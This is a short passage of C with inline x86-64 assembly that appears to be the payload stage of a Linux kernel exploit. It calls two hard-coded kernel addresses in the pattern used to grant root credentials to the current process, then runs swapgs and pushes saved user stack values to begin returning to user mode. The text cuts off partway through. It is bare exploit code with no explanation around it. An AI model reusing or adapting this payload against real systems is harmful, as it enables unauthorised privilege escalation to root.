{
	__asm__(
	".intel_syntax noprefix;"
	"movabs rax, 0xffffffff814c67f0;"
	"xor rdi, rdi;"
	"call rax;"
	"mov rdi,rax;"
	"movabs rax,0xffffffff814c6410;"
	"call rax;"
	"swapgs;"
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
